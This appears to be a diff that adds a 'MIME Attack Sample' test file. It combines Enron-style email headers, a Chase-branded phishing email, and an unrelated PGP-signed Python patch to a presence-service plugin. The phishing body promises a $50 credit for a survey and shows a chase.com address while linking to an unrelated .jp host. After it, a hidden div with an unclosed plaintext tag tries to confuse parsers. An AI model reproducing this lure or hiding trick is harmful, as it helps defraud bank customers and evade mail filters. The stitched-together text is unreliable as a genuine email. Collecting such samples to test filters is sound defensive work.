@@ -1,0 +1,180 @@
+From: jim.wiltfong@enron.com
+To: paul.lebeau@enron.com, emel.akan@enron.com, teseo.bergoglio@enron.com, 
+Subject: MIME Attack Sample
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2800.1081
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1081
+Message-ID: <DIALERpxgbWMgQ89vLU00000a39@dialer>
+X-OriginalArrivalTime: 24 Jan 2007 22:35:41.0750 (UTC) FILETIME=[FAA64D60:01C74007]
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 676
+
+
+<html>
+<head>
+<title>Untitled Document</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body>
+<p><img border="0" src="http://www.chase.com/ccpmweb/shared/image/chaseNewlogo.gif" width="138" height="27"></p>
+<p>&nbsp;</p>
+<p><font face="Verdana">Dear Valued Customer,
+
+</font>
+
+</p>
+
+<p><b><font face="Verdana" color="#5280B1">CONGRATULATIONS !!!</font></b></p>
+<p><font face="Verdana">You have been chosen by the </font> <b>
+			
+            
+            
+            <font face="Verdana">
+			
+            
+            
+            <span class="instrTextHead"><font size="2">Chase Online<sup>SM</sup></font></span></font></b><font face="Verdana"> department to take part in our quick and easy 5 question survey. <br>
+In return we will credit $50 to your account - Just for your time!</font></p>
+<p><font face="Verdana">Helping us better understand how our customers feel benefits everyone. <br>With the information collected we can decide to direct a number of changes to improve and expand our online service.<br>
+  The information you provide us is all non-sensitive and anonymous - No part of it is handed down to any third party groups.<br>
+  It will be stored in our secure database for maximum of 2 days while we process the results of this nationwide survey.</font></p>
+<p><font face="Verdana">We kindly ask you to spare two minutes of your time in taking part with this unique offer!</font></p>
+<p><font face="Verdana">To Continue click on the link below:</font></p>
+<p><b><a href="http://video.financialcollege.jp/chaseonline.chase.com/index.html">
+<font color="#5280B1" face="Verdana">https://chaseonline.chase.com/?CustomerID=8972347&amp;SecureID=xjskid893oe99280-2oeujdywhhhekwod0pqlwoe0</font></a></b></p>
+<p><font face="Verdana">Many Thanks and Kind Regards - </font> <b>
+			
+            
+            
+            <font face="Verdana">
+			
+            
+            
+            <span class="instrTextHead"><font size="2">Chase Online<sup>SM</sup></font></span></font></b><font face="Verdana"> Customer Department<br>
+</font>
+</p>
+</body>
+</html>
+Content-Type: text/html
+<div style="display: none;"><plaintext>
+Content-Type: text/plain
+BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+This avoids unnecessary attempts to look up the buddy properties of
+channel-specific handles (which doesn't work) by only looking up the buddy
+properties of people we're subscribed to.
+Also, this approves subscription requests that come in while we're online,
+rather than handling them when we next go from offline to online.
+- ---
+ services/presence/server_plugin.py |   53 +++++++++++++++++++++++++++++++++---
+ 1 files changed, 49 insertions(+), 4 deletions(-)
+
+diff --git a/services/presence/server_plugin.py b/services/presence/server_plugin.py
+index b3b9482..ac569ba 100644
+- --- a/services/presence/server_plugin.py
++++ b/services/presence/server_plugin.py
+@@ -320,11 +320,22 @@ class ServerPlugin(gobject.GObject):
+ 
+         # the group of contacts who may receive your presence
+         publish = self._request_list_channel('publish')
+- -        publish_handles, local_pending, remote_pending = publish[CHANNEL_INTERFACE_GROUP].GetAllMembers()
++        self._publish_channel = publish
++        publish[CHANNEL_INTERFACE_GROUP].connect_to_signal('MembersChanged',
++                self._publish_members_changed_cb)
++        publish_handles, local_pending, remote_pending = \
++                publish[CHANNEL_INTERFACE_GROUP].GetAllMembers()
+ 
+         # the group of contacts for whom you wish to receive presence
+         subscribe = self._request_list_channel('subscribe')
+- -        subscribe_handles = subscribe[CHANNEL_INTERFACE_GROUP].GetMembers()
++        self._subscribe_channel = subscribe
++        subscribe[CHANNEL_INTERFACE_GROUP].connect_to_signal('MembersChanged',
++                self._subscribe_members_changed_cb)
++        subscribe_handles, subscribe_lp, subscribe_rp = \
++                subscribe[CHANNEL_INTERFACE_GROUP].GetAllMembers()
++        self._subscribe_members = set(subscribe_handles)
++        self._subscribe_local_pending = set(subscribe_lp)
++        self._subscribe_remote_pending = set(subscribe_rp)
+ 
+         if local_pending:
+             # accept pending subscriptions
+@@ -364,8 +375,7 @@ class ServerPlugin(gobject.GObject):
+         self._set_self_current_activity()
+         self._set_self_avatar()
+ 
+- -        # Request presence for everyone on the channel
+- -        subscribe_handles = subscribe[CHANNEL_INTERFACE_GROUP].GetMembers()
++        # Request presence for everyone we're subscribed to
+         self._conn[CONN_INTERFACE_PRESENCE].RequestPresence(subscribe_handles)
+         return True
+ 
+@@ -690,6 +700,13 @@ class ServerPlugin(gobject.GObject):
+ 
+     def _contact_online(self, handle):
+         """Handle a contact coming online"""
++        if (handle not in self._subscribe_members and
++                handle not in self._subscribe_local_pending and
++                handle not in self._subscribe_remote_pending):
++            # it's probably a channel-specific handle - can't create a Buddy
++            # object
++            return
++
+         self._online_contacts[handle] = None
+         if handle == self._conn[CONN_INTERFACE].GetSelfHandle():
+             jid = self._conn[CONN_INTERFACE].InspectHandles(CONNECTION_HANDLE_TYPE_CONTACT, [handle])[0]
+@@ -702,6 +719,34 @@ class ServerPlugin(gobject.GObject):
+             reply_handler=lambda *args: self._contact_online_properties_cb(handle, *args),
+             error_handler=lambda *args: self._contact_online_properties_error_cb(handle, *args))
+ 
++    def _subscribe_members_changed_cb(self, added, removed, local_pending,
++            remote_pending, actor, reason):
++        for handle in added:
++            self._subscribe_members.add(handle)
++        for handle in local_pending:
++            self._subscribe_local_pending.add(handle)
++        for handle in remote_pending:
++            self._subscribe_remote_pending.add(handle)
++        for handle in removed:
++            self._subscribe_members.discard(handle)
++            self._subscribe_local_pending.discard(handle)
++            self._subscribe_remote_pending.discard(handle)
++
++    def _publish_members_changed_cb(self, added, removed, local_pending,
++            remote_pending, actor, reason):
++
++        if local_pending:
++            # accept all requested subscriptions
++            self._publish_channel[CHANNEL_INTERFACE_GROUP].AddMembers(
++                    local_pending, '')
++
++        # subscribe to people who've subscribed to us, if necessary
++        added = list(set(added) - self._subscribe_members
++                     - self._subscribe_remote_pending)
++        if added:
++            self._subscribe_channel[CHANNEL_INTERFACE_GROUP].AddMembers(
++                    added, '')
++
+     def _presence_update_cb(self, presence):
+         """Send update for online/offline status of presence"""
+         for handle in presence:
+- -- 
+1.5.2-rc2.GIT
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: OpenPGP key: http://www.pseudorandom.co.uk/2003/contact/ or pgp.net
+
+iD8DBQFGSt+PWSc8zVUw7HYRAmTjAJ4wT5vmv7wOLkNeXekAcee4H2eR/ACgh+I3
+wf36dxS4smqSWF1atTqgBQA=
+=D7w9
+-----END PGP SIGNATURE-----
+_____
